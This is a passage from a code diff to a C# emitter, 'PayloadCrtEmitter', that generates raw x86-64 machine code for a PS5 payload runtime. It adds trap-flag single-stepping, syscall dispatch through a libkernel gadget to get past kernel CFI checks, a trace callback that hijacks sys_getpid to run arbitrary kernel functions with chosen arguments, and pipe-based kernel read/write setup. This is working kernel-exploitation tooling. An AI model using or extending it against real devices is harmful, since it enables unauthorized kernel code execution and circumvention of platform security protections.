+        int getClearTfDisp = clearTfHandlerOff - (getClearTfHandlerOff + 7);
+        b[getClearTfHandlerOff + 3] = (byte)(getClearTfDisp & 0xFF);
+        b[getClearTfHandlerOff + 4] = (byte)((getClearTfDisp >> 8) & 0xFF);
+        b[getClearTfHandlerOff + 5] = (byte)((getClearTfDisp >> 16) & 0xFF);
+        b[getClearTfHandlerOff + 6] = (byte)((getClearTfDisp >> 24) & 0xFF);
+        _getClearTfHandlerOff = getClearTfHandlerOff;
+        _getClearTfHandlerBytes = b.Count - getClearTfHandlerOff;
+
+        // ---- __sp_set_tf ----
+        // Sets EFLAGS.TF (Trap Flag) to enable single-step tracing.
+        // pop rax; pushfq; or byte [rsp+1],1; popfq; push rax; ret
+        int setTfOff = b.Count;
+        b.AddRange([0x58, 0x9C, 0x80, 0x4C, 0x24, 0x01, 0x01, 0x9D, 0x50, 0xC3]);
+        _setTfOff = setTfOff;
+        _setTfBytes = b.Count - setTfOff;
+
+        // ---- __sp_set_tf_and_getpid ----
+        // Sets TF then calls getpid through the ptr_syscall gadget (getpid+10 in
+        // libkernel). MUST use the gadget (not raw syscall) because the PS5 kernel
+        // has syscall CFI checking — RCX must point into libkernel or the kernel
+        // takes a different code path. The original calls through libkernel's getpid:
+        // p_getpid = dlsym(0x1, "getpid").
+        int setTfAndGetpidOff = b.Count;
+        _currentRelocs = _setTfAndGetpidRelocs;
+        b.AddRange([
+            0x9C,                         // pushfq
+            0x80, 0x4C, 0x24, 0x01, 0x01, // or byte [rsp+1], 1
+            0x9D,                         // popfq → TF set, next instruction suppressed
+            0xB8, 0x14, 0x00, 0x00, 0x00, // mov eax, 20 (SYS_getpid) — SUPPRESSED
+            0xFF, 0x15, 0, 0, 0, 0,       // call [rip+ptr_syscall] — through libkernel
+            0xC3,                         // ret
+        ]);
+        AddRel(RelocSymbol.PtrSyscall, b.Count - 5);
+        _setTfAndGetpidOff = setTfAndGetpidOff;
+        _setTfAndGetpidBytes = b.Count - setTfAndGetpidOff;
+
+        // ---- __sp_trace_init(rdi=kframe, rsi=uretframe, rdx=traceStart,
+        //                      rcx=traceEnd, r8=traceProg, r9=traceFrameSize) ----
+        // Writes all 6 trace BSS globals. Called from managed code via DirectPInvoke
+        // because CRT BSS symbols are not in .dynsym (dlsym can't find them).
+        int traceInitOff = b.Count;
+        _currentRelocs = _traceInitRelocs;
+        // mov [rip+kframe], rdi
+        b.AddRange([0x48, 0x89, 0x3D, 0, 0, 0, 0]);
+        AddRel(RelocSymbol.Kframe, b.Count - 4);
+        // mov [rip+uretframe], rsi
+        b.AddRange([0x48, 0x89, 0x35, 0, 0, 0, 0]);
+        AddRel(RelocSymbol.Uretframe, b.Count - 4);
+        // mov [rip+trace_start], rdx
+        b.AddRange([0x48, 0x89, 0x15, 0, 0, 0, 0]);
+        AddRel(RelocSymbol.TraceStart, b.Count - 4);
+        // mov [rip+trace_end], rcx
+        b.AddRange([0x48, 0x89, 0x0D, 0, 0, 0, 0]);
+        AddRel(RelocSymbol.TraceEnd, b.Count - 4);
+        // mov [rip+trace_prog], r8
+        b.AddRange([0x4C, 0x89, 0x05, 0, 0, 0, 0]);
+        AddRel(RelocSymbol.TraceProg, b.Count - 4);
+        // mov [rip+trace_frame_size], r9
+        b.AddRange([0x4C, 0x89, 0x0D, 0, 0, 0, 0]);
+        AddRel(RelocSymbol.TraceFrameSize, b.Count - 4);
+        // ret
+        b.Add(0xC3);
+        _traceInitOff = traceInitOff;
+        _traceInitBytes = b.Count - traceInitOff;
+
+        // ---- __sp_trace_set_prog(rdi=traceProg) ----
+        // Sets just the trace_prog BSS global (called before each kfncall).
+        int traceSetProgOff = b.Count;
+        _currentRelocs = _traceSetProgRelocs;
+        // mov [rip+trace_prog], rdi
+        b.AddRange([0x48, 0x89, 0x3D, 0, 0, 0, 0]);
+        AddRel(RelocSymbol.TraceProg, b.Count - 4);
+        // ret
+        b.Add(0xC3);
+        _traceSetProgOff = traceSetProgOff;
+        _traceSetProgBytes = b.Count - traceSetProgOff;
+
+        // ---- __sp_get_ret2trace() ----
+        // Returns the address of __sp_ret2trace. Uses LEA with a relocation
+        // to the ret2trace function (intra-.text, patched at link time).
+        int getRet2traceOff = b.Count;
+        // lea rax, [rip+disp32]  → disp32 will be patched to ret2trace
+        b.AddRange([0x48, 0x8D, 0x05, 0, 0, 0, 0]);
+        // Patch: disp32 = ret2traceOff - (getRet2traceOff + 7)
+        int getRet2traceLeaAt = b.Count - 4;
+        // ret
+        b.Add(0xC3);
+        _getRet2traceOff = getRet2traceOff;
+        _getRet2traceBytes = b.Count - getRet2traceOff;
+        // Patch the LEA displacement to point at ret2trace
+        WriteDispFrom(getRet2traceLeaAt, ret2traceOff);
+
+        // ---- __sp_get_int1_return() ----
+        // Returns the address of the .int1_return label inside __sp_run_in_kernel.
+        // The label lives at byte offset 164 within run_in_kernel (verified by
+        // instruction counting: LEA at +15 + 7-byte LEA emits displacement 142,
+        // so target = 15 + 7 + 142 = 164). Callers pre-seed the uretframe RIP
+        // slot with this address so the doreti_iret trampoline chain returns to
+        // userspace at .int1_return (which restores registers and copies the
+        // kframe back via copyout) instead of the trace ring-buffer handler.
+        int getInt1ReturnOff = b.Count;
+        // lea rax, [rip+disp32]  → disp32 will be patched to run_in_kernel + 164
+        b.AddRange([0x48, 0x8D, 0x05, 0, 0, 0, 0]);
+        int getInt1ReturnLeaAt = b.Count - 4;
+        // ret
+        b.Add(0xC3);
+        _getInt1ReturnOff = getInt1ReturnOff;
+        _getInt1ReturnBytes = b.Count - getInt1ReturnOff;
+        // Patch the LEA displacement to point at run_in_kernel + 164 (.int1_return)
+        WriteDispFrom(getInt1ReturnLeaAt, runInKernelOff + 164);
+
+        // ---- __sp_pipe(rdi=buf) ----
+        // Creates a pipe via SYS_pipe(42). FreeBSD returns read fd in RAX and
+        // write fd in RDX; both are written to the caller's int[2] buffer.
+        // Dispatches through ptr_syscall (the getpid+10 gadget), not a raw
+        // syscall instruction, because raw syscall is blocked (PPRBUG-22859).
+        int pipeOff = b.Count;
+        _currentRelocs = _pipeRelocs;
+        b.AddRange([
+            0x55,                               // push rbp
+            0x48, 0x89, 0xE5,                   // mov rbp, rsp
+            0x53,                               // push rbx
+            0x48, 0x89, 0xFB,                   // mov rbx, rdi        ; save buf
+            0xB8, 0x2A, 0x00, 0x00, 0x00,       // mov eax, 42         ; SYS_pipe
+        ]);
+        // call qword [rip+ptr_syscall]
+        b.AddRange([0xFF, 0x15, 0, 0, 0, 0]);
+        AddRel(RelocSymbol.PtrSyscall, b.Count - 4);
+        b.AddRange([
+            0x89, 0x03,                         // mov [rbx], eax      ; fds[0] = read fd
+            0x89, 0x53, 0x04,                   // mov [rbx+4], edx    ; fds[1] = write fd
+            0x5B,                               // pop rbx
+            0x5D,                               // pop rbp
+            0xC3,                               // ret
+        ]);
+        _pipeOff = pipeOff;
+        _pipeBytes = b.Count - pipeOff;
+
+        // ---- __sp_pipe_reinit(rdi=pipe_addr, esi=pipe_read, edx=pipe_write) ----
+        // Rewrites the three pipe-related BSS globals so that subsequent
+        // kernel_write/kernel_copyout primitives use the new pipe pair.
+        int pipeReinitOff = b.Count;
+        _currentRelocs = _pipeReinitRelocs;
+        // mov [rip+pipe_addr], rdi
+        b.AddRange([0x48, 0x89, 0x3D, 0, 0, 0, 0]);
+        AddRel(RelocSymbol.PipeAddr, b.Count - 4);
+        // mov [rip+rw_pipe_0], esi
+        b.AddRange([0x89, 0x35, 0, 0, 0, 0]);
+        AddRel(RelocSymbol.RwPipe0, b.Count - 4);
+        // mov [rip+rw_pipe_1], edx
+        b.AddRange([0x89, 0x15, 0, 0, 0, 0]);
+        AddRel(RelocSymbol.RwPipe1, b.Count - 4);
+        // ret
+        b.Add(0xC3);
+        _pipeReinitOff = pipeReinitOff;
+        _pipeReinitBytes = b.Count - pipeReinitOff;
+
+        // ---- __sp_getpid_to_fncall ----
+        // CRT assembly version of the trace callback (replaces managed GetpidToFncall).
+        // Called by ret2trace for each single-stepped kernel instruction.
+        // Input: rdi = pointer to 21-qword register snapshot.
+        // Logic:
+        //   if (regs[0] == cpu_switch) { untrace(regs); return; }
+        //   if (regs[0] == sys_getpid) { redirect regs to fncall target; untrace(regs); return; }
+        //   if (regs[0] == syscall_after) { fncall_ans = regs[5]; regs[5] = 0; regs[2] &= ~0x100; }
+        // The untrace path builds a 48-byte iret frame on the kernel stack and copies it
+        // via an intra-section call to __sp_kmemcpy (INT 0xB3).
+        int getpidToFncallOff = b.Count;
+        _currentRelocs = _getpidToFncallRelocs;
+        // push rbp; mov rbp, rsp; push rbx; push r12; push r13
+        b.AddRange([0x55, 0x48, 0x89, 0xE5, 0x53, 0x41, 0x54, 0x41, 0x55]);
+        // mov rbx, rdi  (save regs pointer)
+        b.AddRange([0x48, 0x89, 0xFB]);
+        // mov rax, [rbx]  (regs[0] = RIP)
+        b.AddRange([0x48, 0x8B, 0x03]);
+
+        // ---- Check cpu_switch ----
+        // cmp rax, [rip+fncall_cpu_switch]
+        b.AddRange([0x48, 0x3B, 0x05, 0, 0, 0, 0]);
+        AddRel(RelocSymbol.FncallCpuSwitch, b.Count - 4);
+        // jne .not_cpu_switch
+        b.AddRange([0x75, 0x00]); // placeholder, patch below
+        int jneNotCpuSwitchAt = b.Count - 1;
+
+        // ---- Untrace path (shared between cpu_switch and sys_getpid intercept) ----
+        // Build iret frame on kernel stack: sub rsp and write 6 qwords via kmemcpy.
+        // This matches the untrace-callback pattern that clears TF before returning.
+        int untraceEntryOff = b.Count;
+        // mov r12, [rbx+24]  ; regs[3] = RSP
+        b.AddRange([0x4C, 0x8B, 0x63, 0x18]);
+        // sub r12, 0x30
+        b.AddRange([0x49, 0x83, 0xEC, 0x30]);
+        // sub rsp, 0x30  ; local frame for iret data
+        b.AddRange([0x48, 0x83, 0xEC, 0x30]);
+        // mov rax, [rip+fncall_doreti_iret]
+        b.AddRange([0x48, 0x8B, 0x05, 0, 0, 0, 0]);
+        AddRel(RelocSymbol.FncallDoretiIret, b.Count - 4);
+        // mov [rsp], rax  ; frame[0] = doreti_iret
+        b.AddRange([0x48, 0x89, 0x04, 0x24]);
+        // mov rax, [rip+fncall_nop_ret]
+        b.AddRange([0x48, 0x8B, 0x05, 0, 0, 0, 0]);
+        AddRel(RelocSymbol.FncallNopRet, b.Count - 4);
+        // mov [rsp+8], rax  ; frame[1] = nop_ret (RIP)
+        b.AddRange([0x48, 0x89, 0x44, 0x24, 0x08]);
+        // mov qword [rsp+16], 0x20  ; frame[2] = CS=kernel
+        b.AddRange([0x48, 0xC7, 0x44, 0x24, 0x10, 0x20, 0x00, 0x00, 0x00]);
+        // mov rax, [rbx+16]  ; regs[2] = EFLAGS
+        b.AddRange([0x48, 0x8B, 0x43, 0x10]);
+        // mov [rsp+24], rax  ; frame[3] = EFLAGS
+        b.AddRange([0x48, 0x89, 0x44, 0x24, 0x18]);
+        // mov rax, [rbx+24]  ; original RSP
+        b.AddRange([0x48, 0x8B, 0x43, 0x18]);
+        // mov [rsp+32], rax  ; frame[4] = RSP
+        b.AddRange([0x48, 0x89, 0x44, 0x24, 0x20]);
+        // mov qword [rsp+40], 0  ; frame[5] = SS=0
+        b.AddRange([0x48, 0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00]);
+        // kmemcpy(dst=r12, src=rsp, len=48): rdi=r12, rsi=rsp, rdx=48
+        // mov rdi, r12
+        b.AddRange([0x4C, 0x89, 0xE7]);
+        // mov rsi, rsp
+        b.AddRange([0x48, 0x89, 0xE6]);
+        // mov edx, 48
+        b.AddRange([0xBA, 0x30, 0x00, 0x00, 0x00]);
+        // call __sp_kmemcpy (intra-section, patched later)
+        b.AddRange([0xE8, 0x00, 0x00, 0x00, 0x00]);
+        int getpidToFncallKmemcpyDisp = b.Count - 4;
+        kernelCallDisps.Add((getpidToFncallKmemcpyDisp, "kmemcpy"));
+        // add rsp, 0x30  ; restore local frame
+        b.AddRange([0x48, 0x83, 0xC4, 0x30]);
+        // mov [rbx+24], r12  ; regs[3] = new RSP
+        b.AddRange([0x4C, 0x89, 0x63, 0x18]);
+        // and qword [rbx+16], -257  ; clear TF (bit 8) in EFLAGS
+        b.AddRange([0x48, 0x81, 0x63, 0x10, 0xFF, 0xFE, 0xFF, 0xFF]);
+        // jmp .done
+        b.AddRange([0xE9, 0x00, 0x00, 0x00, 0x00]);
+        int jmpDoneFromUntraceAt = b.Count - 4;
+
+        // .not_cpu_switch:
+        int notCpuSwitchOff = b.Count;
+        b[jneNotCpuSwitchAt] = (byte)(notCpuSwitchOff - (jneNotCpuSwitchAt + 1));
+
+        // ---- Check sys_getpid ----
+        // cmp rax, [rip+fncall_sys_getpid]
+        b.AddRange([0x48, 0x3B, 0x05, 0, 0, 0, 0]);
+        AddRel(RelocSymbol.FncallSysGetpid, b.Count - 4);
+        // jne .not_getpid
+        b.AddRange([0x75, 0x00]); // placeholder
+        int jneNotGetpidAt = b.Count - 1;
+
+        // ---- Intercept: redirect to target function ----
+        // regs[0] = fncall_fn
+        b.AddRange([0x48, 0x8B, 0x05, 0, 0, 0, 0]);
+        AddRel(RelocSymbol.FncallFn, b.Count - 4);
+        b.AddRange([0x48, 0x89, 0x03]);  // mov [rbx], rax
+        // regs[12] = fncall_arg0 (RDI)
+        b.AddRange([0x48, 0x8B, 0x05, 0, 0, 0, 0]);
+        AddRel(RelocSymbol.FncallArg0, b.Count - 4);
+        b.AddRange([0x48, 0x89, 0x43, 0x60]);  // mov [rbx+96], rax
+        // regs[11] = fncall_arg1 (RSI)
+        b.AddRange([0x48, 0x8B, 0x05, 0, 0, 0, 0]);
+        AddRel(RelocSymbol.FncallArg1, b.Count - 4);
+        b.AddRange([0x48, 0x89, 0x43, 0x58]);  // mov [rbx+88], rax
+        // regs[7] = fncall_arg2 (RDX)
+        b.AddRange([0x48, 0x8B, 0x05, 0, 0, 0, 0]);
+        AddRel(RelocSymbol.FncallArg2, b.Count - 4);
+        b.AddRange([0x48, 0x89, 0x43, 0x38]);  // mov [rbx+56], rax
+        // regs[6] = fncall_arg3 (RCX)
+        b.AddRange([0x48, 0x8B, 0x05, 0, 0, 0, 0]);
+        AddRel(RelocSymbol.FncallArg3, b.Count - 4);
+        b.AddRange([0x48, 0x89, 0x43, 0x30]);  // mov [rbx+48], rax
+        // regs[13] = fncall_arg4 (R8)
+        b.AddRange([0x48, 0x8B, 0x05, 0, 0, 0, 0]);
+        AddRel(RelocSymbol.FncallArg4, b.Count - 4);
+        b.AddRange([0x48, 0x89, 0x43, 0x68]);  // mov [rbx+104], rax
+        // regs[14] = fncall_arg5 (R9)
+        b.AddRange([0x48, 0x8B, 0x05, 0, 0, 0, 0]);
+        AddRel(RelocSymbol.FncallArg5, b.Count - 4);
+        b.AddRange([0x48, 0x89, 0x43, 0x70]);  // mov [rbx+112], rax
+        // jmp .untrace_entry (reuse the untrace path above)
+        b.AddRange([0xE9, 0x00, 0x00, 0x00, 0x00]);
+        int jmpUntraceFromGetpidAt = b.Count - 4;
+        WriteDispFrom(jmpUntraceFromGetpidAt, untraceEntryOff);
+
+        // .not_getpid:
+        int notGetpidOff = b.Count;
+        b[jneNotGetpidAt] = (byte)(notGetpidOff - (jneNotGetpidAt + 1));
+
+        // ---- Check syscall_after ----
+        // cmp rax, [rip+fncall_syscall_after]
+        b.AddRange([0x48, 0x3B, 0x05, 0, 0, 0, 0]);
+        AddRel(RelocSymbol.FncallSyscallAfter, b.Count - 4);
+        // jne .done
+        b.AddRange([0x75, 0x00]); // placeholder
+        int jneNotSyscallAfterAt = b.Count - 1;
+
+        // fncall_ans = regs[5] (RAX register in snapshot)
+        b.AddRange([0x48, 0x8B, 0x43, 0x28]);  // mov rax, [rbx+40]
+        b.AddRange([0x48, 0x89, 0x05, 0, 0, 0, 0]);  // mov [rip+fncall_ans], rax
+        AddRel(RelocSymbol.FncallAns, b.Count - 4);
+        // regs[5] = 0
+        b.AddRange([0x48, 0xC7, 0x43, 0x28, 0x00, 0x00, 0x00, 0x00]);
+        // regs[2] &= ~0x100 (clear TF)
+        b.AddRange([0x48, 0x81, 0x63, 0x10, 0xFF, 0xFE, 0xFF, 0xFF]);
+
+        // .done:
+        int doneOff = b.Count;
+        b[jneNotSyscallAfterAt] = (byte)(doneOff - (jneNotSyscallAfterAt + 1));
+        // Patch the jmp from untrace path
+        WriteDispFrom(jmpDoneFromUntraceAt, doneOff);
+
+        // pop r13; pop r12; pop rbx; pop rbp; ret
+        b.AddRange([0x41, 0x5D, 0x41, 0x5C, 0x5B, 0x5D, 0xC3]);
+        _getpidToFncallOff = getpidToFncallOff;
+        _getpidToFncallBytes = b.Count - getpidToFncallOff;
+
+        // ---- __sp_fncall_init ----
+        // void __sp_fncall_init(rdi=cpu_switch, rsi=sys_getpid, rdx=syscall_after,
+        //                       rcx=fncall_fn, r8=arg0, r9=arg1,
+        //                       stack[0]=arg2, stack[1]=arg3, stack[2]=arg4,
+        //                       stack[3]=arg5, stack[4]=ans (ignored, always 0),
+        //                       stack[5]=nop_ret, stack[6]=doreti_iret)
+        // Writes all 13 fncall BSS globals from managed code.
+        int fncallInitOff = b.Count;
+        _currentRelocs = _fncallInitRelocs;
+        // push rbp; mov rbp, rsp  (frame pointer for stack arg access)
+        b.AddRange([0x55, 0x48, 0x89, 0xE5]);
+        // mov [rip+cpu_switch], rdi
+        b.AddRange([0x48, 0x89, 0x3D, 0, 0, 0, 0]);
+        AddRel(RelocSymbol.FncallCpuSwitch, b.Count - 4);
+        // mov [rip+sys_getpid], rsi
+        b.AddRange([0x48, 0x89, 0x35, 0, 0, 0, 0]);
+        AddRel(RelocSymbol.FncallSysGetpid, b.Count - 4);
+        // mov [rip+syscall_after], rdx
+        b.AddRange([0x48, 0x89, 0x15, 0, 0, 0, 0]);
+        AddRel(RelocSymbol.FncallSyscallAfter, b.Count - 4);
+        // mov [rip+fncall_fn], rcx
+        b.AddRange([0x48, 0x89, 0x0D, 0, 0, 0, 0]);
+        AddRel(RelocSymbol.FncallFn, b.Count - 4);
+        // mov [rip+arg0], r8
+        b.AddRange([0x4C, 0x89, 0x05, 0, 0, 0, 0]);
+        AddRel(RelocSymbol.FncallArg0, b.Count - 4);
+        // mov [rip+arg1], r9
+        b.AddRange([0x4C, 0x89, 0x0D, 0, 0, 0, 0]);
+        AddRel(RelocSymbol.FncallArg1, b.Count - 4);
+        // Stack layout after push rbp: [rbp]=old_rbp, [rbp+8]=retaddr,
+        //   [rbp+16]=arg7, [rbp+24]=arg8, [rbp+32]=arg9, [rbp+40]=arg10,
+        //   [rbp+48]=arg11, [rbp+56]=arg12, [rbp+64]=arg13
+        // mov rax, [rbp+16]  ; arg7 = arg2
+        b.AddRange([0x48, 0x8B, 0x45, 0x10]);
+        b.AddRange([0x48, 0x89, 0x05, 0, 0, 0, 0]);
+        AddRel(RelocSymbol.FncallArg2, b.Count - 4);
+        // mov rax, [rbp+24]  ; arg8 = arg3
+        b.AddRange([0x48, 0x8B, 0x45, 0x18]);
+        b.AddRange([0x48, 0x89, 0x05, 0, 0, 0, 0]);
+        AddRel(RelocSymbol.FncallArg3, b.Count - 4);
+        // mov rax, [rbp+32]  ; arg9 = arg4
+        b.AddRange([0x48, 0x8B, 0x45, 0x20]);
+        b.AddRange([0x48, 0x89, 0x05, 0, 0, 0, 0]);
+        AddRel(RelocSymbol.FncallArg4, b.Count - 4);
+        // mov rax, [rbp+40]  ; arg10 = arg5
+        b.AddRange([0x48, 0x8B, 0x45, 0x28]);
+        b.AddRange([0x48, 0x89, 0x05, 0, 0, 0, 0]);
+        AddRel(RelocSymbol.FncallArg5, b.Count - 4);
+        // zero fncall_ans
+        b.AddRange([0x48, 0xC7, 0x05, 0, 0, 0, 0, 0x00, 0x00, 0x00, 0x00]);
+        AddRel(RelocSymbol.FncallAns, b.Count - 8);
+        // mov rax, [rbp+56]  ; arg12 = nop_ret (skip arg11=ans at [rbp+48])
+        b.AddRange([0x48, 0x8B, 0x45, 0x38]);
+        b.AddRange([0x48, 0x89, 0x05, 0, 0, 0, 0]);
+        AddRel(RelocSymbol.FncallNopRet, b.Count - 4);
+        // mov rax, [rbp+64]  ; arg13 = doreti_iret
+        b.AddRange([0x48, 0x8B, 0x45, 0x40]);
+        b.AddRange([0x48, 0x89, 0x05, 0, 0, 0, 0]);
+        AddRel(RelocSymbol.FncallDoretiIret, b.Count - 4);
+        // pop rbp; ret
+        b.AddRange([0x5D, 0xC3]);
+        _fncallInitOff = fncallInitOff;
+        _fncallInitBytes = b.Count - fncallInitOff;
+
+        // ---- __sp_fncall_init_core ----
+        // void __sp_fncall_init_core(rdi=cpu_switch, rsi=sys_getpid,
+        //                           rdx=syscall_after, rcx=nop_ret, r8=doreti_iret)
+        // Writes the 5 control-flow BSS globals. All in registers — no stack args.
+        int fncallInitCoreOff = b.Count;
+        _currentRelocs = _fncallInitCoreRelocs;
+        b.AddRange([0x48, 0x89, 0x3D, 0, 0, 0, 0]); // mov [rip+cpu_switch], rdi
+        AddRel(RelocSymbol.FncallCpuSwitch, b.Count - 4);
+        b.AddRange([0x48, 0x89, 0x35, 0, 0, 0, 0]); // mov [rip+sys_getpid], rsi
+        AddRel(RelocSymbol.FncallSysGetpid, b.Count - 4);
+        b.AddRange([0x48, 0x89, 0x15, 0, 0, 0, 0]); // mov [rip+syscall_after], rdx
+        AddRel(RelocSymbol.FncallSyscallAfter, b.Count - 4);
+        b.AddRange([0x48, 0x89, 0x0D, 0, 0, 0, 0]); // mov [rip+nop_ret], rcx
+        AddRel(RelocSymbol.FncallNopRet, b.Count - 4);
+        b.AddRange([0x4C, 0x89, 0x05, 0, 0, 0, 0]); // mov [rip+doreti_iret], r8
+        AddRel(RelocSymbol.FncallDoretiIret, b.Count - 4);
+        b.AddRange([0x48, 0xC7, 0x05, 0, 0, 0, 0, 0x00, 0x00, 0x00, 0x00]); // zero fncall_ans
+        AddRel(RelocSymbol.FncallAns, b.Count - 8);
+        b.Add(0xC3); // ret
+        _fncallInitCoreOff = fncallInitCoreOff;
+        _fncallInitCoreBytes = b.Count - fncallInitCoreOff;
+
+        // ---- __sp_get_fncall_ans ----
+        // ulong __sp_get_fncall_ans(void)
+        // Returns the value of the fncall_ans BSS global.
+        int getFncallAnsOff = b.Count;
+        _currentRelocs = _getFncallAnsRelocs;
+        // mov rax, [rip+fncall_ans]
+        b.AddRange([0x48, 0x8B, 0x05, 0, 0, 0, 0]);
+        AddRel(RelocSymbol.FncallAns, b.Count - 4);
+        // ret
+        b.Add(0xC3);
+        _getFncallAnsOff = getFncallAnsOff;
+        _getFncallAnsBytes = b.Count - getFncallAnsOff;
+
+        // ---- __sp_set_fncall_args ----
+        // void __sp_set_fncall_args(rdi=fn, rsi=a0, rdx=a1, rcx=a2, r8=a3, r9=a4, stack[0]=a5)
+        // Writes fncall_fn and fncall_arg0..5 BSS globals before each Call().
+        int setFncallArgsOff = b.Count;
+        _currentRelocs = _setFncallArgsRelocs;
+        // push rbp; mov rbp, rsp  (frame pointer for 7th arg on stack)
+        b.AddRange([0x55, 0x48, 0x89, 0xE5]);
+        // mov [rip+fncall_fn], rdi
+        b.AddRange([0x48, 0x89, 0x3D, 0, 0, 0, 0]);
+        AddRel(RelocSymbol.FncallFn, b.Count - 4);
+        // mov [rip+arg0], rsi
+        b.AddRange([0x48, 0x89, 0x35, 0, 0, 0, 0]);
+        AddRel(RelocSymbol.FncallArg0, b.Count - 4);
+        // mov [rip+arg1], rdx
+        b.AddRange([0x48, 0x89, 0x15, 0, 0, 0, 0]);
+        AddRel(RelocSymbol.FncallArg1, b.Count - 4);
+        // mov [rip+arg2], rcx
+        b.AddRange([0x48, 0x89, 0x0D, 0, 0, 0, 0]);
+        AddRel(RelocSymbol.FncallArg2, b.Count - 4);
+        // mov [rip+arg3], r8
+        b.AddRange([0x4C, 0x89, 0x05, 0, 0, 0, 0]);
+        AddRel(RelocSymbol.FncallArg3, b.Count - 4);
+        // mov [rip+arg4], r9
+        b.AddRange([0x4C, 0x89, 0x0D, 0, 0, 0, 0]);
+        AddRel(RelocSymbol.FncallArg4, b.Count - 4);
+        // mov rax, [rbp+16]  ; arg7 = a5
+        b.AddRange([0x48, 0x8B, 0x45, 0x10]);
+        b.AddRange([0x48, 0x89, 0x05, 0, 0, 0, 0]);
+        AddRel(RelocSymbol.FncallArg5, b.Count - 4);
+        // zero fncall_ans
+        b.AddRange([0x48, 0xC7, 0x05, 0, 0, 0, 0, 0x00, 0x00, 0x00, 0x00]);
+        AddRel(RelocSymbol.FncallAns, b.Count - 8);
+        // pop rbp; ret
+        b.AddRange([0x5D, 0xC3]);
+        _setFncallArgsOff = setFncallArgsOff;
+        _setFncallArgsBytes = b.Count - setFncallArgsOff;
+
+        // ---- __sp_get_fncall_callback ----
+        // nint __sp_get_fncall_callback(void)
+        // Returns the address of __sp_getpid_to_fncall via LEA.
+        int getFncallCallbackOff = b.Count;
+        // lea rax, [rip+disp32] -> patched to getpidToFncallOff
+        b.AddRange([0x48, 0x8D, 0x05, 0, 0, 0, 0]);
+        int getFncallCallbackLeaAt = b.Count - 4;
+        // ret
+        b.Add(0xC3);
+        _getFncallCallbackOff = getFncallCallbackOff;
+        _getFncallCallbackBytes = b.Count - getFncallCallbackOff;
+        WriteDispFrom(getFncallCallbackLeaAt, getpidToFncallOff);
+
         // ---- Patch intra-section calls for kernel.c functions ----
         foreach (var (at, target) in kernelCallDisps)
         {
@@ -11907,6 +12738,9 @@ public static class PayloadCrtEmitter
                 "kernel_write" => kernelWriteOff,
                 "getlong_inline" => getlongOff,
                 "get_proc_file" => getProcFileOff,
+                "kmemcpy" => kmemcpyOff,
+                "copyin_r0" => copyinR0Off,
+                "copyout_r0" => copyoutR0Off,
                 _ => throw new InvalidOperationException($"Unknown kernel call target: {target}"),
             };
             WriteDispFrom(at, off);
@@ -12074,6 +12908,7 @@ public static class PayloadCrtEmitter
         int spResolveOkRodataOff = -1;
         int spIsthreadedOkRodataOff = -1, spIsthreadedFailRodataOff = -1;
         int spPayloadRunEnterRodataOff = -1, spMainExitRodataOff = -1;
+        int spMainRetOkRodataOff = -1, spMainRetFailRodataOff = -1;
         int spPayloadTerminateRodataOff = -1;
         int spRtldSprxInitRodataOff = -1, spRtldSoInitRodataOff = -1;
         int spRtldPayloadInitStartRodataOff = -1, spRtldPayloadInitDoneRodataOff = -1;
@@ -12114,6 +12949,10 @@ public static class PayloadCrtEmitter
             b.AddRange(Encoding.ASCII.GetBytes(SpPayloadRunEnterName)); b.Add(0);
             spMainExitRodataOff = b.Count;
             b.AddRange(Encoding.ASCII.GetBytes(SpMainExitName)); b.Add(0);
+            spMainRetOkRodataOff = b.Count;
+            b.AddRange(Encoding.ASCII.GetBytes("sp:main:ret:0\n")); b.Add(0);
+            spMainRetFailRodataOff = b.Count;
+            b.AddRange(Encoding.ASCII.GetBytes("sp:main:ret:err\n")); b.Add(0);
             spPayloadTerminateRodataOff = b.Count;
             b.AddRange(Encoding.ASCII.GetBytes(SpPayloadTerminateName)); b.Add(0);
             // RTLD subsystem init checkpoint breadcrumbs
@@ -12344,6 +13183,8 @@ public static class PayloadCrtEmitter
             WriteDispTo(bcIsthreadedFailLeaAt, spIsthreadedFailRodataOff);
             WriteDispTo(bcPayloadRunEnterLeaAt, spPayloadRunEnterRodataOff);
             WriteDispTo(bcMainExitLeaAt, spMainExitRodataOff);
+            WriteDispTo(bcMainRetOkLeaAt, spMainRetOkRodataOff);
+            WriteDispTo(bcMainRetFailLeaAt, spMainRetFailRodataOff);
             WriteDispTo(bcPayloadTerminateLeaAt, spPayloadTerminateRodataOff);
             // RTLD subsystem init checkpoint LEAs
             WriteDispTo(bcRtldSprxInitLeaAt, spRtldSprxInitRodataOff);
@@ -13001,7 +13842,11 @@ public static class PayloadCrtEmitter
                         .. _sprxCloseRelocs, .. _sprxDestroyRelocs,
                         .. _dynlibHandleRelocs,
                         .. _payloadInitRelocs,
-                        .. _ucredRelocs, .. _mdbgRelocs, .. _procioRelocs];
+                        .. _ucredRelocs, .. _mdbgRelocs, .. _procioRelocs,
+                        .. _kmemcpyRelocs, .. _ret2traceRelocs, .. _runInKernelRelocs,
+                        .. _traceInitRelocs, .. _traceSetProgRelocs, .. _setTfAndGetpidRelocs,
+                        .. _pipeRelocs, .. _pipeReinitRelocs,
+                        .. _fncallInitCoreRelocs];
 
         _startOff = startOff;
         _getArgsOff = getArgsOff;
@@ -13126,6 +13971,28 @@ public static class PayloadCrtEmitter
     private static int _kernelGetUcredNgroupsOff, _kernelGetUcredNgroupsBytes;
     private static int _kernelSetUcredNgroupsOff, _kernelSetUcredNgroupsBytes;
     private static int _kernelSetUcredSceAttr0Off, _kernelSetUcredSceAttr0Bytes;
+    private static int _kfncallOff, _kfncallBytes;
+    private static int _kmemcpyOff, _kmemcpyBytes;
+    private static int _ret2traceOff, _ret2traceBytes;
+    private static int _runInKernelOff, _runInKernelBytes;
+    private static int _clearTfHandlerOff, _clearTfHandlerBytes;
+    private static int _getClearTfHandlerOff, _getClearTfHandlerBytes;
+    private static int _fncallInitCoreOff, _fncallInitCoreBytes;
+    private static List<Reloc> _fncallInitCoreRelocs = [];
+    private static int _setTfOff, _setTfBytes;
+    private static int _traceInitOff, _traceInitBytes;
+    private static int _traceSetProgOff, _traceSetProgBytes;
+    private static int _getRet2traceOff, _getRet2traceBytes;
+    private static int _getInt1ReturnOff, _getInt1ReturnBytes;
+    private static int _setTfAndGetpidOff, _setTfAndGetpidBytes;
+    private static int _pipeOff, _pipeBytes;
+    private static int _pipeReinitOff, _pipeReinitBytes;
+    private static int _getpidToFncallOff, _getpidToFncallBytes;
+    private static int _fncallInitOff, _fncallInitBytes;
